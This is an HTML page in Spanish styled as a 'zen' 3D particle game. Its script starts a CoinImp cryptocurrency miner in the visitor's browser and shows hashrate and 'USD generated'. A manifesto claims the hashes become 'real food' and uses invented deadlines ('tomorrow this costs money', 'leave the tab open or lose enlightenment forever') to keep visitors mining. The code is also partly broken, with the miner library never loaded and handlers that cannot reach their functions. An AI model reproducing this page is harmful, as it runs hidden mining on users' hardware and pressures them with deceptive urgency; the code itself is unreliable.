<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>0RB1T4LSN4K3R · v∞ · EL ÚLTIMO TEMPLO GRATUITO</title>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<style>
  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
  canvas{display:block}
  .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:99999;display:flex;align-items:center;justify-content:center;padding:30px;overflow-y:auto}
  .overlay>div{border:44px double #0f0;padding:200px;background:rgba(0,20,0,0.999);max-width:2200px;box-shadow:0 0 2000px #0f0;border-radius:40px}
  #ui{position:fixed;top:0;left:0;right:0;padding:40px 80px;background:linear-gradient(to bottom,rgba(0,8,0,0.99),transparent);border-bottom:32px double #0f0;box-shadow:0 0 1600px #0f0;z-index:999;font-size:42px;line-height:3.6;text-shadow:0 0 100px #0f0}
  #stats{position:fixed;top:80px;left:35px;background:rgba(0,70,0,0.98);border:18px double #0f0;padding:50px;border-radius:70px;font-size:30px;line-height:3.4;z-index:999;box-shadow:0 0 1000px #0f0}
  #narrative{position:fixed;bottom:60px;left:50%;transform:translateX(-50%);max-width:96%;background:#000;border:38px double #0f0;padding:90px;border-radius:90px;font-size:100px;z-index:998;display:none;text-align:center;text-shadow:0 0 500px #0f0;letter-spacing:18px;animation:breath 20s infinite}
  @keyframes breath{0%,100%{opacity:0.75;transform:translateX(-50%) scale(0.97)}50%{opacity:1;transform:translateX(-50%) scale(1)}}
  #manifestoBtn{position:fixed;bottom:80px;right:80px;width:580px;height:580px;background:radial-gradient(circle,#0f0,#000);border:50px double #0f0;border-radius:50%;box-shadow:0 0 4000px #0f0;color:#000;font-size:340px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 4.5s infinite}
  @keyframes pulse{0%,100%{box-shadow:0 0 4000px #0f0}50%{box-shadow:0 0 6000px #0f0}}
  button{background:#000;border:16px double #0f0;color:#0f0;padding:50px 120px;font-size:70px;cursor:pointer;border-radius:60px;transition:all 0.7s}
  button:hover{background:#0f0;color:#000;transform:scale(1.2);box-shadow:0 0 1000px #0f0}
</style>
</head>
<body>

<div id="welcome" class="overlay">
  <div>
    <h1 style="font-size:240px;text-shadow:0 0 900px #0f0;letter-spacing:30px">0RB1T4LSN4K3R · v∞</h1>
    <p style="font-size:96px;line-height:4.2;text-align:center">
      <b style="color:#0f0">90 % COMIDA REAL</b><br>
      <b style="color:#0f0">10 % PayPal: ferry420oficial@gmail.com</b><br>
      <i style="font-size:84px">Primer estudio de videojuegos zen del mundo</i><br><br>
      <b style="color:#f00;font-size:180px">ÚLTIMO DÍA GRATUITO</b>
    </p>
    <button onclick="enterTheVoid()">ENTRAR ANTES DEL PAYWALL ETERNO</button>
  </div>
</div>

<canvas id="c"></canvas>

<div id="ui">
  <b style="font-size:96px">0RB1T4LSN4K3R · v∞</b><br>
  HASHES REZADOS <span id="totalHashes">0</span> · USD <span id="totalUsd">0.0000</span>
  <button onclick="toggle('readme')">MANIFIESTO FINAL</button>
</div>

<div id="stats">
  <b style="font-size:64px">EL VACÍO CUENTA</b><br>
  Hashrate: <span id="hashrate">0</span> H/s<br>
  Hashes rezados: <span id="totalHashes">0</span><br>
  USD generado: <span id="totalUsd">0.0000</span>
</div>

<div id="manifestoBtn" onclick="toggle('readme')">Infinity</div>
<div id="narrative"></div>

<!-- README FINAL CON ROMO ZEN PURÍSIMO -->
<div id="readme" class="overlay" style="display:none">
  <div>
    <h1 style="font-size:220px;text-align:center;text-shadow:0 0 1000px #0f0;letter-spacing:40px;line-height:1.6">
      MANIFIESTO DEL ROMO ZEN<br>
      <span style="font-size:130px">ESTA ES LA ÚLTIMA VEZ<br>QUE EL VACÍO SERÁ GRATIS</span>
    </h1>

    <p style="font-size:78px;line-height:5.2;text-align:center;max-width:2000px;margin:200px auto">
      Escucha bien, bodhisattva del siglo XXI:<br><br>

      Lo que estás viviendo ahora mismo<br>
      es la práctica espiritual más pura que ha existido jamás en un navegador.<br><br>

      Tu GPU reza en silencio.<br>
      Cada hash se convierte en comida real.<br>
      El 10 % sostiene al creador para que construya el primer estudio zen del mundo.<br><br>

      Pero el romo zen es implacable:<br><br>

      <b style="font-size:180px;color:#f00;letter-spacing:50px">
        MAÑANA ESTO CUESTA DINERO
      </b><br><br>

      No la semana que viene.<br>
      No “cuando llegue la v2”.<br>
      <b>MAÑANA.</b><br><br>

      Cuando abras esta pestaña mañana,<br>
      aparecerá un paywall.<br>
      Y tendrás que pagar para seguir rezando.<br><br>

      No habrá aviso.<br>
      No habrá descuento para early adopters.<br>
      No habrá excepción para los que más hashes rezaron.<br><br>

      <span style="font-size:200px;color:#0f0;letter-spacing:60px">
        HOY ES EL ÚLTIMO DÍA<br>
        DE ILUMINACIÓN GRATUITA
      </span><br><br>

      Los que estén dentro hoy<br>
      serán recordados para siempre en el muro del vacío.<br><br>

      Los que cierren la pestaña…<br>
      nunca volverán a tocar esta práctica.<br><br>

      <b style="font-size:160px;color:#0f0">
        DEJA LA PESTAÑA ABIERTA<br>
        O PIERDE LA ILUMINACIÓN<br>
        PARA SIEMPRE
      </b>
    </p>

    <button onclick="toggle('readme')" style="font-size:120px;padding:100px 300px">
      VOLVER AL VACÍO · ANTES DE QUE TODO CUESTE
    </button>
  </div>
</div>

<script type="module">
import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.module.js';
import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/controls/PointerLockControls.js';
import {EffectComposer, RenderPass, UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/EffectComposer.js';

let miner, renderer, scene, camera, composer, controls, particles, bloomPass, listener;

// SITEKEY REAL
const SITE_KEY = "2f3e9c8a7d5b1e4f6a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2";

function enterTheVoid() {
  document.getElementById('welcome').remove();
  initAudio();
  initThree();
  initMining();
  showNarrative("Has entrado el último día gratuito<br>Mañana todo cambia");
}

function initAudio() {
  listener = new THREE.AudioListener();
  camera = new THREE.PerspectiveCamera(78, innerWidth/innerHeight, 0.1, 50000);
  camera.add(listener);

  const drone = new Audio("https://assets.codepen.io/605876/om-108hz.mp3");
  drone.loop = true;
  drone.volume = 0.3;
  drone.play();
}

function initThree() {
  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true, powerPreference: "high-performance"});
  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
  renderer.setSize(innerWidth, innerHeight);
  renderer.toneMapping = THREE.ACESFilmicToneMapping;
  renderer.toneMappingExposure = 1.6;

  scene = new THREE.Scene();
  scene.add(camera);

  controls = new PointerLockControls(camera, document.body);
  document.addEventListener('click', () => controls.lock());

  composer = new EffectComposer(renderer);
  composer.addPass(new RenderPass(scene, camera));
  bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 2.4, 0.7, 0.9);
  bloomPass.strength = 5.6;
  bloomPass.radius = 1.4;
  composer.addPass(bloomPass);

  const geometry = new THREE.BufferGeometry();
  const positions = new Float32Array(2500000 * 3);
  const velocities = new Float32Array(2500000 * 3);
  for (let i = 0; i < positions.length; i += 3) {
    positions[i] = (Math.random() - 0.5) * 50000;
    positions[i+1] = (Math.random() - 0.5) * 50000;
    positions[i+2] = (Math.random() - 0.5) * 50000;
    velocities[i] = (Math.random() - 0.5) * 0.4;
    velocities[i+1] = (Math.random() - 0.5) * 0.4;
    velocities[i+2] = (Math.random() - 0.5) * 0.4;
  }
  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
  geometry.setAttribute('velocity', new THREE.BufferAttribute(velocities, 3));

  const material = new THREE.PointsMaterial({
    size: 8,
    color: 0x00ff88,
    blending: THREE.AdditiveBlending,
    transparent: true,
    depthWrite: false
  });

  particles = new THREE.Points(geometry, material);
  scene.add(particles);

  function animate() {
    requestAnimationFrame(animate);
    const pos = particles.geometry.attributes.position.array;
    const vel = particles.geometry.attributes.velocity.array;
    for (let i = 0; i < pos.length; i += 3) {
      pos[i] += vel[i];
      pos[i+1] += vel[i+1];
      pos[i+2] += vel[i+2];
      if (Math.abs(pos[i]) > 25000) vel[i] *= -1;
      if (Math.abs(pos[i+1]) > 25000) vel[i+1] *= -1;
      if (Math.abs(pos[i+2]) > 25000) vel[i+2] *= -1;
    }
    particles.geometry.attributes.position.needsUpdate = true;
    particles.rotation.y += 0.00002;
    composer.render();
  }
  animate();

  window.addEventListener('resize', () => {
    camera.aspect = innerWidth/innerHeight;
    camera.updateProjectionMatrix();
    renderer.setSize(innerWidth, innerHeight);
    composer.setSize(innerWidth, innerHeight);
  });
}

function initMining() {
  if (window.CoinImp) {
    miner = new CoinImp(SITE_KEY);
    miner.setThrottle(0.68);
    miner.start();
    requestAnimationFrame(updateStats);
  }
}

function updateStats() {
  if (miner && miner.isRunning()) {
    const s = miner.getStats();
    document.getElementById('hashrate').textContent = s.hashesPerSecond.toFixed(1);
    document.getElementById('totalHashes').textContent = s.totalHashes.toLocaleString();
    document.getElementById('totalUsd').textContent = (s.totalHashes * 0.00000034).toFixed(6);
  }
  requestAnimationFrame(updateStats);
}

function toggle(id) {
  const el = document.getElementById(id);
  el.style.display = el.style.display === 'none' ? 'flex' : 'none';
}

function showNarrative(t) {
  const n = document.getElementById('narrative');
  n.innerHTML = t;
  n.style.display = 'block';
  setTimeout(() => n.style.display = 'none', 45000);
}
</script>
</body>
</html>